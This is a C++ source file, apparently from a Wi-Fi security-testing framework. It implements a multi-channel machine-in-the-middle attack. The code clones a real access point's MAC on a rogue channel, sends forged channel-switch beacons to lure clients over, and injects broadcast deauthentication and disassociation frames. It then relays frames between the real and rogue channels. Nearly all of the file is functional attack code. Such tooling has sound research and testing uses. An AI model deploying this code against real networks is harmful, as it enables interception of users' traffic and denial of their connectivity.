McMitm::McMitm(ActorPtr rogue_sta, ActorPtr rogue_ap, const ActorPtr &sta, ActorPtr ap,
	const optional<filesystem::path> &run_folder, const bool only_to_mitm):
	rogue_sta(std::move(rogue_sta)),
	rogue_ap(std::move(rogue_ap)),
	sta(sta),
	ap(std::move(ap)),
	only_to_mitm(only_to_mitm),
	client_state(
		sta.get(SK::mac), run_folder ? optional{ run_folder.value() / "observer" / "client_state" } : nullopt) {
	if(run_folder) { create_public_dirs(run_folder.value() / "observer" / "client_state"); }
}

McMitm::~McMitm() { stop(); }

//TODO cache frames like in the channel_switch.cpp
void McMitm::send_csa_beacon(const int numpairs, const optional<HWAddress<6>> &target, int beacon_interval_ms) const {
	// Intel firmware: must see count >= 2 before count  //TODO source? Python?
	for(int i = 0; i < numpairs; ++i) {
		for(int count = CSA_attack::CHANNEL_SWITCH_MAX; count >= 0; --count) {
			RadioTap csa_rt = CSA_attack::get_CSA_beacon(
				ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, count, beacon.get());
			if(target.has_value()) {
				if(auto *b = csa_rt.find_pdu<Dot11Beacon>()) b->addr1(*target);
			}
			send_to_real(csa_rt);
			interruptible_sleep(milliseconds(beacon_interval_ms));
		}
	}
}

void McMitm::send_disas(const HWAddress<6> &macaddr) const {
	Dot11Disassoc disas(macaddr, ap.get(SK::mac));
	disas.addr3(ap.get(SK::mac));
	disas.reason_code(0);
	send_to_rogue(disas);
	log(LogLevel::INFO, "Rogue channel: injected Disassociation to {}", macaddr);
}

void McMitm::send_deauth_as_ap() const {
	Dot11Deauthentication deauth(client_state.get_mac(), ap.get(SK::mac));
	deauth.addr3(ap.get(SK::mac));
	deauth.reason_code(3);

	RadioTap rt{};
	rt.inner_pdu(deauth);
	send_to_real(rt);
}

bool McMitm::should_check_rogue_beacons() const {
	// With some network cards, beacons generated by Linux are reflected back in monitor mode
	// On other devices that's not done.
	// Monitor mode is a mess
	// (comment from python)
	static const unordered_set<string> affected_drivers = { "ath9k_htc" };
	try {
		return affected_drivers.contains(rogue_ap->get_driver_name());
	} catch(const config_err &) { return false; }
}

void McMitm::setup_real_AP_RSN_frames() {
	rogue_sta->set_iface_up();
	rogue_sta->set_channel(netconfig.real_channel);

	// get real AP beacon
	beacon = scan::RSN_scan(rogue_sta.get(SK::iface),
		20, //TODO hardcoded timeouts
		ap.get(SK::permanent_mac),
		std::nullopt,
		rogue_sta[SK::netns]);
	if(beacon == nullptr)
		throw run_err("No beacon received of network \"{}\". Is monitor mode working? Did you enter the correct SSID?",
			ap.get(SK::ssid));

	log(LogLevel::INFO,
		"Monitor mode: using {} on real channel and {} on rogue channel.",
		rogue_sta.get(SK::iface),
		rogue_ap.get(SK::iface));

	//if(netconfig.real_channel > 13) log(LogLevel::WARNING, "Attack not yet tested against 5 GHz networks.");
	//netconfig.find_rogue_channel(); //TODO

	// get a probe response for fast replying
	if(auto *ch_ie = beacon->search_option(Dot11ManagementFrame::DS_SET))
		const_cast<uint8_t *>(ch_ie->data_ptr())[0] = netconfig.rogue_channel.ch_num;
	probe_resp = make_unique<Dot11ProbeResponse>(beacon_to_probe_resp(*beacon, netconfig.rogue_channel));
	log(LogLevel::INFO, "Target network {} detected on channel {}", ap.get(SK::mac), netconfig.real_channel.ch_num);
}

void McMitm::run(RunStatus &rs, const int timeout_sec) {

	const auto &att_cfg = rs.config().at("attack_config");
	const int beacon_interval_ms = att_cfg.at("beacon_interval_ms");
	const int beacon_warning_sec = att_cfg.at("beacon_warning_sec");

	const bool check_rogue_beacons = should_check_rogue_beacons();
	log(LogLevel::INFO,
		"Note: keep >1 meter between interfaces. Else packet delivery is unreliable & target may disconnect");
	setup_real_AP_RSN_frames();

	log(LogLevel::INFO,
		"Will use {} to create rogue AP on channel {}",
		rogue_ap->get_mon_iface(),
		netconfig.rogue_channel.ch_num);

	// put the monitor interface in active ACK mode for ACK back to AP

	const string nic_client_ap = AP_IFACE_PREFIX + "client_ack"; //FIXME hardcoded
	/*if(rogue_sta[BK::active_monitor]) { //FIXME not supported yet,_RSN_frames dont work with active
		rogue_sta->set_iface_down();
		rogue_sta->set_mac_address(client_state.get_mac());
		rogue_sta->set_monitor_mode(true);
		//hw_capabilities::run_cmd({"iw", rogue_sta.get(SK::iface), "set", "monitor", "active"}, rogue_sta[SK::netns]);
		//interruptible_sleep(seconds(15));
		//rogue_sta->run({"iw", "dev", rogue_sta.get(SK::iface), "set", "channel", to_string(netconfig.real_channel.ch_num)});
		rogue_sta->set_iface_up();
	} else {*/
	rogue_sta->set_mac_address(client_state.get_mac());
	// client need to ACK -> AP
	start_ap(rs, nic_client_ap, rogue_sta, netconfig.real_channel, *beacon, client_state.get_mac());
	//}

	const string bpf = "(wlan type data or mgt) and (wlan host " + ap.get(SK::permanent_mac) + " or wlan host " +
		sta.get(SK::permanent_mac) + " or wlan host " + rogue_sta.get(SK::permanent_mac) + " or wlan host " +
		rogue_ap.get(SK::permanent_mac) + ")";

	sock_real = make_unique<MonitorSocket>(rogue_sta.get(SK::iface), rogue_sta[SK::netns]);
	sock_real->set_filter(bpf);

	// set up the rogue AP and interfaces
	log(LogLevel::INFO, "Setting MAC address of {} to {}", rogue_ap->get_ap_iface(), ap.get(SK::mac));
	rogue_ap->set_iface_up();
	rogue_ap->set_mac_address(ap.get(SK::mac));

	// rogue AP  ACK  AP(rogue) -> back to client
	start_ap(rs, rogue_ap->get_ap_iface(), rogue_ap, netconfig.rogue_channel, *beacon, ap.get(SK::mac));
	// TODO
	// hw_capabilities::run_cmd({"iw", "dev", nic_real_ap, "station", "add", client_mac.to_string()}, rogue_sta-[SK::netns], false);

	sock_rogue = make_unique<MonitorSocket>(rogue_ap.get(SK::iface), rogue_ap[SK::netns]);
	sock_rogue->set_filter(bpf);

	log(LogLevel::INFO, "Giving the rogue AP one second to initialize ...");
	interruptible_sleep(seconds(1)); //TODO needed?

	rs.start_observers(ObserverRunPolicy::SKIP); //after mc_mitm preparation, skip because dmesg

	// first disconnect
	send_csa_beacon(4, nullopt, beacon_interval_ms);
	client_state.update_state(ClientState::Sent_to_rogue);

	// only for non MFP clients, AP -> broadcast
	Dot11Deauthentication deauth(HWAddress<6>::broadcast, ap.get(SK::mac));
	deauth.addr3(ap.get(SK::mac));
	deauth.reason_code(3);
	send_to_real(deauth);

	// monitoring both channels and performing needed actions
	last_real_beacon = steady_clock::now();
	last_rogue_beacon = steady_clock::now();
	auto next_beacon = steady_clock::now();
	const auto start_time = steady_clock::now();

	int csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
	while(!stop_mitm) {
		if(timeout_sec > 0 && steady_clock::now() > start_time + seconds(timeout_sec)) {
			log(LogLevel::INFO, "McMitm timeout reached, stopping.");
			break;
		}

		// wait up to 100ms for data on either socket - mirrors Python select(..., 0.1)
		const int fd_real = pcap_get_selectable_fd(sock_real->get_pcap_handle());
		const int fd_rogue = pcap_get_selectable_fd(sock_rogue->get_pcap_handle());

		if(fd_real < 0 || fd_rogue < 0)
			log(LogLevel::ERROR, "pcap_get_selectable_fd failed: fd_real={} fd_rogue={}", fd_real, fd_rogue);

		const int max_fd = max(fd_real, fd_rogue) + 1;

		fd_set read_fds;
		FD_ZERO(&read_fds);
		FD_SET(fd_real, &read_fds);
		FD_SET(fd_rogue, &read_fds);

		timeval tv{ 0, 100'000 }; // 100ms
		select(max_fd, &read_fds, nullptr, nullptr, &tv);

		if(FD_ISSET(fd_real, &read_fds)) {
			while(auto recv_res = sock_real->recv()) handle_rx_real_chan(recv_res.pdu, recv_res.raw);
		}
		if(FD_ISSET(fd_rogue, &read_fds)) {
			while(auto recv_res = sock_rogue->recv()) handle_rx_rogue_chan(recv_res.pdu, recv_res.raw);
		}

		if(next_beacon <= steady_clock::now()) {
			const bool client_associated = client_state.get_state() >= ClientState::GotMitm;
			if(!client_associated) {
				const bool custom = hooks && hooks->send_periodic_beacon(*this);
				if(!custom) {
					RadioTap csa_rt = CSA_attack::get_CSA_beacon(
						ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel, csa_count, beacon.get());
					send_to_real(csa_rt);
					if(--csa_count < 0) csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
				}
			}
			next_beacon += milliseconds(beacon_interval_ms);
		}

		if(last_real_beacon + seconds(beacon_warning_sec) < steady_clock::now()) {
			log(LogLevel::WARNING, "Didn't receive beacon from real AP for two seconds");
			last_real_beacon = steady_clock::now();
		}

		if(check_rogue_beacons && last_rogue_beacon + seconds(beacon_warning_sec) < steady_clock::now()) {
			log(LogLevel::WARNING, "Didn't receive beacon from rogue AP for two seconds");
			last_rogue_beacon = steady_clock::now();
		}
	}
}

void McMitm::stop() {
	log(LogLevel::INFO, "Cleaning up MitM...");
	sock_real.reset();
	sock_rogue.reset();
	stop_ap(AP_IFACE_PREFIX + "client_ack", rogue_sta[SK::netns]);
	stop_ap(rogue_ap->get_ap_iface(), rogue_ap[SK::netns]);
}
